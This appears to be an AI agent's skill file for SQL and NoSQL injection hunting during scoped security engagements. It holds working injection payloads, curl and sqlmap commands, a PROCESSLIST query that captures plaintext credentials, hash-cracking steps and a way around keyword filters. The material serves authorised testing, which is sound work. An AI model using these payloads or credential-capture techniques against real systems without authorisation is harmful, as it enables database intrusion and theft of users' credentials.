---
name: hunt-sqli
description: SQLi and NoSQLi hunting - error-based, boolean-blind, time-based, UNION, NoSQL operator injection. sqlmap automation after manual confirmation. Wiki-first, FIND schema output.
---

# Hunt: SQL Injection

## Pre-Attack: Wiki Query (MANDATORY)
```
qmd_query "SQL injection SQLi" via wiki-search MCP -> read matching technique page if found.
```
Apply known payload variants, NoSQL patterns, and ORM-specific bypasses already documented. See [[orm-injection]] for ORM-layer query-builder injection (Django/Rails/Sequelize-style unsafe filter/order-by construction) distinct from raw SQL string concatenation.


**Self-heal:** If the wiki query returns nothing, create a stub `wiki/techniques/<area>/<slug>.md` (frontmatter + a `## Observed during <engagement>` section built from your findings) before proceeding, so the gap fills instead of silently recurring.

## Scope Check
- Confirm target is in scope
- Read Deadends.md - skip paths already marked exhausted

## OOB Gate (READ FIRST)
**Blind SQLi claims require confirmation. No exceptions.** A single slow response is not proof: a time-based positive needs a repeatable delta (baseline vs injected, re-run), and an out-of-band claim needs a real callback.

NOT confirmation: one non-repeatable slow response, a generic 500, a WAF "SQL injection detected" string. IS confirmation: a reproducible time delta on repeat, or a DNS/HTTP hit to your unique Burp Collaborator / interactsh subdomain from a DNS-exfil payload (MySQL `LOAD_FILE`/UNC, MSSQL `xp_dirtree`, Oracle `UTL_HTTP`).

When you plant a blind/OOB payload, append a row to `targets/<eng>/oob.md`: `| <token> | <sink url+param> | sqli | <date> | waiting | |` (columns: token | sink | class | planted | status | source, where token = your unique Burp Collaborator / interactsh label). The recon-capture hook auto-correlates incoming callbacks to flip the row to HIT and SessionStart surfaces HITs; a HIT row is the confirmation gate to scaffold the FIND. Do NOT claim a blind SQLi without a HIT row.

## Attack Surface Signals
URL patterns:
```
/search?q=  /filter?category=  /sort?by=&order=  /report?start_date=
/api/v1/items?id=  /index.php?id=  /gallery?album_id=  ?page=&limit=
```
Content-type `application/json` with nested objects -> potential NoSQL. PHP + Apache -> MySQL. Express + MongoDB -> NoSQL.

## Methodology

**Order: in-band before blind.** Try error-based and UNION (direct data/errors) BEFORE
boolean/time-based — blind is slow and easily masked (e.g. an anti-bruteforce `SLEEP()` on the
login page adds a constant delay that hides your injected `SLEEP`). UNION/error need a place
where query output or a DB error is REFLECTED; if the page you're hitting reflects nothing,
test the SQLi on a different page that does.

1. Enumerate all input vectors (GET, POST, JSON body, headers, cookies, path segments)
2. Baseline the response (length, status, time)
3. Error probes in **every quote context** — `'` `"` `` ` `` `')` `"))` and numeric/no-quote.
   A `'` doing nothing does NOT mean safe: the sink may be double-quoted (`WHERE x="$v"`). Watch
   for a reflected DB error or any length change.
4. In-band first: error-based (`extractvalue`/`updatexml`) and UNION (`ORDER BY` for col count,
   then `UNION SELECT`). Mind display truncation when sizing extracted chunks.
5. Only then blind: boolean (`AND 1=1` vs `AND 1=2`) then time (`SLEEP(5)`/`pg_sleep(5)`/`WAITFOR`).
6. **Second-order:** if login/register is parameterized, the SAME stored value may be unsafe on
   another page (profile/dashboard/"last logins"). Register the payload as the username, log in,
   then load the page that renders it. See the PROCESSLIST section below.
7. NoSQL (MongoDB): replace value with `{"$gt": ""}` or `param[$ne]=invalid`
8. Automate with sqlmap on confirmed candidate (won't find second-order or PROCESSLIST timing):
```bash
# ONE confirming curl (baseline vs injected); then hand off to sqlmap, don't hand-loop probes
curl -o /dev/null -s -w "%{time_total}\n" "https://target.com/search?q=test' AND SLEEP(5)-- -"

# sqlmap owns the rest: DBMS fingerprint, WAF bypass, enumeration, extraction
sqlmap -u "https://target.com/search?q=test" --level=3 --risk=2 --batch --dbs
```
Keep exactly ONE manual curl in the writeup as the confirming PoC; sqlmap owns enumeration.
8. Escalate impact: UNION extraction, INFORMATION_SCHEMA dump, file read/write if perms allow
9. Document: Burp repeater screenshot + sqlmap output + non-sensitive data sample
10. **Distill to wiki (when confirmed):** if the finding is a reusable NoSQL/ORM bypass or
    a generic default cred, stage a GENERIC wiki candidate now (no client host):
    `python3 scripts/wiki-stage.py --kind technique --slug <slug> --target-page techniques/web/sql-injection.md`
    (or `--kind default-cred`). Promote later via `scripts/wiki-promote.py`.

## Key Payloads
```sql
-- Error probes
' '' ` ') ")) ' OR '1'='1 admin'--

-- Time-based (MySQL)
' AND SLEEP(5)--

-- Time-based (MSSQL)
'; WAITFOR DELAY '0:0:5'--

-- UNION (find column count first)
' ORDER BY 1-- ' ORDER BY 10--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,database(),3--

-- NoSQL (MongoDB JSON body)
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}}

-- NoSQL (query string)
username[$ne]=invalid&password[$ne]=invalid
```

## Second-order + PROCESSLIST credential capture

When the app hashes the password *inside* the SQL (`... AND pass=md5("PLAINTEXT")`) the plaintext
sits in the live query. If a bot/admin logs in periodically (often held a few seconds by an
anti-bruteforce `SLEEP()`), read it via the SQLi — the app connects as the same DB user, so you
see its threads even without global `PROCESS` priv:
```sql
" UNION SELECT 1,SUBSTRING((SELECT info FROM information_schema.PROCESSLIST
  WHERE id=(SELECT MIN(id) FROM information_schema.PROCESSLIST)),POS,16)-- -   -- POS=1,17,33,...
```
`INFO` is non-NULL only while running -> poll fast, timed to the bot. Output truncates to the
sink's display width -> register one second-order account per N-char window, log each in, hammer
the rendering page with all sessions during the bot's window, concatenate the blocks. Recovered
creds are often **reused for SSH**, not the web login. Full writeup: [[sql-injection]].

## Cracking recovered hashes (try easy first)
1. Unsalted MD5/SHA1 -> **online lookup first** (CrackStation 190GB table, hashes.com) — instant
   for leaked/common passwords that rockyou+rules miss. (Note: needs a browser/captcha; if the
   tooling host has no internet, do it from a box that does.)
2. Then local: `hashcat -m 0 h /usr/share/wordlists/rockyou.txt -r best64`, then `john`.
3. A hash that resists all of the above on a "hard" box may be a **decoy/rabbit-hole** — pivot
   (e.g. PROCESSLIST capture above) instead of grinding. A `0e…` MD5 is only a magic hash for
   PHP `==` if EVERY char after `0e` is a digit.

## App keyword-filter + login redirect oracle (sqlmap blind-spot)
App rolls its own `preg_match` blacklist (returns a fixed "SQL Injection detected" string). Map it
one token at a time, then bypass: `AND` logic not `OR`, `-- -` not `/**/`, quoted literals not `0x`
hex, `CASE WHEN` not `IFNULL`. If the post-login page is static, the **login redirect is the
oracle**: `user' AND 1=1-- -` -> 302 (TRUE), `AND 1=2` -> 200 (FALSE). sqlmap usually FAILS here
(hex-encodes data as `0x` -> blocked; follows the 302 -> diff confusion), so hand-roll a boolean
extractor and **clear the session cookie every probe** (a login oracle otherwise stays
authenticated -> always-true). Don't name the script `enum.py` (shadows stdlib). See [[sql-injection]].

## FIND Output

If SQLi confirmed (data extracted or time delta >5s on repeat):
```
Create Vulns/Research/FIND-XXX-HIGH-sqli-<host>.md
Severity: CRITICAL if full DB dump or RCE via xp_cmdshell demonstrated; HIGH for data extraction; MEDIUM for blind time-based only
Add row to Vuln-index.md
```

If path exhausted:
```
Append to Deadends.md: - [ ] SQLi on <host> param <x> -- all probes 200/same-length, no time delta
```

Report: Status + files created.
